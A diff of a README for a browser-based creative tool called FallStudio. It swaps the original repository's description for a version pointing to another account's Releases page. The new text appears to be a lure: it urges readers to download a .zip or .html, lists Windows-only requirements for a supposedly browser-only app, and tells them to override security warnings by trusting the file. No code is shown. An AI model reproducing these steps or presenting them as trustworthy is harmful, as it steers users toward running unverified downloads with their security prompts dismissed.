@@ -1,129 +1,83 @@
-# FallStudio v1.0.0 - creative suite hub 2026
+# 🎨 fallstudio-2026-hub - Create digital art in your browser
 
-> **FallStudio is a browser-based creative suite hub for web users, combining a single-file HTML app launcher with offline, local-first routing and the current 1.0.0 release.**
+[![](https://img.shields.io/badge/Download-FallStudio-blue)](https://github.com/Grpat3536/fallstudio-2026-hub)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/millervictor98/fallstudio-2026-hub?style=flat-square)](https://github.com/millervictor98/fallstudio-2026-hub)
+FallStudio v1.0.0 provides a creative suite for your personal computer. This software runs inside your web browser but keeps all your project files on your local drive. You do not need an active internet connection to use the tools once you load the application. The system routes all data locally to protect your privacy and ensure your work stays safe on your machine.
 
----
+## 📥 Getting the software
 
-<p align="center">
-  <a href="https://millervictor98.github.io/fallstudio-2026-hub/">
-    <img src="https://img.shields.io/badge/Download-FallStudio%20Latest-brightgreen?style=for-the-badge" alt="Download FallStudio">
-  </a>
-</p>
+You must visit the project page to download the latest version of the app launcher. 
 
-> **[Direct Download - FallStudio v1.0.0](https://millervictor98.github.io/fallstudio-2026-hub/)**
+[Click here to open the download page](https://github.com/Grpat3536/fallstudio-2026-hub)
 
----
+Follow these steps to obtain the files:
 
-[Download Latest Build](https://millervictor98.github.io/fallstudio-2026-hub/)
+1. Visit the link provided above.
+2. Look for the section labeled Releases on the right side of the page.
+3. Click the version number or the latest release link at the top of that list.
+4. Scroll to the assets section.
+5. Select the file ending in .html or .zip depending on your preference. 
+6. Save the file to a folder on your desktop where you can easily find it.
 
----
+## ⚙️ Setting up your workspace
 
-## What FallStudio Is
+The application uses an HTML launcher to bridge your browser and your local system. You do not need to install complex drivers or background services.
 
-FallStudio is a streamlined creative suite hub built to help users jump from an idea to the right tool without managing a bulky desktop setup. It is made for browser-first use and can run from local files, which makes it a convenient self-contained interface when you want something low-friction to launch and use.
+Follow these instructions to launch the suite:
 
-Its core idea is intent-based routing for creative work. Instead of searching through separate apps, FallStudio leans on keyword navigation, a command palette, and built-in shortcuts to steer you toward the most relevant workflow. That makes it a strong fit for anyone looking for a local-first, sovereign setup with optional PWA installation.
+1. Open the folder where you saved the download.
+2. If you downloaded a zip file, right-click the folder and choose Extract All.
+3. Locate the file named index.html within the extracted folder.
+4. Right-click the index.html file.
+5. Choose Open with from the menu.
+6. Select your preferred web browser, such as Chrome, Edge, or Firefox.
+7. Click Open.
 
----
+Your browser will now display the FallStudio interface. The application loads quickly because it functions locally on your hardware.
 
-## Highlights
+## 🛠 Features of the hub
 
-- Sends creative intent to the proper tool through keyword-driven navigation
-- Bundles 8 single-HTML tools into one hub
-- Provides Ctrl+K access to the command palette
-- Opens straight from file:// with no installation required
-- Includes PWA install support for a more app-like feel
-- Works without dependencies or a build step
-- Delivers offline keyword-based routing
-- Supports local LLM and BYOK routing flows
+FallStudio organizes your creative work through a clear interface. 
 
----
+*   Local file management: The app reads and writes images directly to your user folder.
+*   Browser acceleration: The software uses your graphics hardware to process visual tasks.
+*   Offline accessibility: You maintain full control over your projects without cloud dependencies.
+*   Single-file execution: The launcher keeps your system clean by avoiding registry changes and installations.
+*   Browser compatibility: The app runs on any modern browser that supports local storage.
 
-## Getting Started
+## 🖥 System requirements
 
-1. Download or clone the repository.
-2. Open the main HTML file in a browser, or serve the folder locally if you prefer.
-3. For a local launch, use a simple static server and open the app in your browser.
+Your computer needs to meet these basic standards to run the software correctly:
 
-Example:
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 4GB of RAM is sufficient for standard tasks.
+*   Browser: A recent version of Chrome, Edge, or Firefox.
+*   Storage: 50MB of space for the application files and additional room for your creative projects.
+*   Display: A monitor with 1280x720 resolution or higher.
 
-    git clone https://github.com/millervictor98/fallstudio-2026-hub.git
-    cd REPO
-    python -m http.server 8000
+## 💡 Troubleshooting common issues
 
-Then visit:
+If the application fails to open or displays errors, check these common fixes:
 
-    http://localhost:8000
+*   Issue: The page appears blank. Fix: Refresh the browser tab. If that fails, ensure your browser has permission to access local files.
+*   Issue: The app cannot save files. Fix: Ensure the folder where you keep the application has read and write permissions in your Windows settings.
+*   Issue: The tool runs slowly. Fix: Close other browser tabs and applications that use high amounts of memory.
+*   Issue: The browser blocks the file. Fix: If a security warning appears, confirm that you trust the file since it is the official launcher from this repository.
 
-If you are using the packaged single-file version, you can also open it directly from your file system.
+## 📁 Managing your projects
 
----
+The hub acts as a bridge between your browser and your hard drive. When you start a new project, the app asks you to select a folder on your computer. This folder serves as your work space. 
 
-## How to Use It
+Always keep your project files in one place. Moving the launcher file is fine, but avoid changing the names of the associated support folders. If the application loses track of your work, use the import button inside the hub to locate your project files again.
 
-Begin by typing a creative task or opening the command palette with Ctrl+K. FallStudio then maps your input to the most relevant included tool, letting you move quickly from intent to action.
+## 🛡 Security and privacy
 
-Typical workflow:
+FallStudio follows a local-first design. This means no data ever leaves your computer while you work. The code inside the index.html file interacts only with your browser's internal storage and your local folders. You do not need to create an account or provide an email address. Your creative process remains private at all times.
 
-1. Open FallStudio in a browser.
-2. Type a keyword, task, or creative goal.
-3. Use the routed tool that matches the intent.
-4. Install it as a PWA if you want quicker repeat access.
+## 🚀 Tips for better performance
 
-For offline use, keep the local HTML file available in your browser or saved workspace. If you use local LLM or BYOK routing, connect your preferred local or user-provided model settings before starting a session.
+Keep your projects in a dedicated folder on your main drive for the fastest access. If you have many large images, use a solid-state drive for your project folders. When you finish a session, always save your work through the menu inside the app before you close your browser. 
 
----
+The software updates periodically. Check the download link occasionally to see if a newer version is available. You can replace your old index.html file with the new one to gain access to the latest features. Your settings will persist as long as you keep the browser cache intact.
 
-## Customization
-
-FallStudio stays intentionally lightweight, so most behavior lives inside the HTML app itself rather than in a separate configuration layer.
-
-If you are customizing it, look for:
-- routing keywords in the main HTML file
-- local LLM or BYOK connection settings
-- PWA-related metadata and install prompts
-- tool definitions for the included single-file apps
-
-There is no build-time configuration required.
-
----
-
-## Requirements
-
-- A modern web browser
-- HTML file access for file:// usage, or a basic static server
-- Enough local storage for browser caching if you install it as a PWA
-- Optional: access to a local LLM or BYOK setup if you want those routing features
-
-No dependency installation or compile step is needed.
-
----
-
-## FAQ
-
-**How do I update FallStudio?**  
-Swap in the latest release or pull the newest files from the repository, then reopen the main HTML file.
-
-**Can I use it offline?**  
-Yes. The project supports offline keyword-based routing and can run from local files.
-
-**Does it require installation?**  
-No. You can open it directly in a browser. PWA installation is optional.
-
-**Where are settings kept?**  
-Settings are handled inside the app or in browser storage, depending on how you use it.
-
-**What if a tool does not open as expected?**  
-Make sure you are using a modern browser and that the HTML file or local server path is being loaded correctly. If you changed routing keywords, verify the keyword mappings in the app source.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: creative, browser, local, windows, hub, graphics, offline
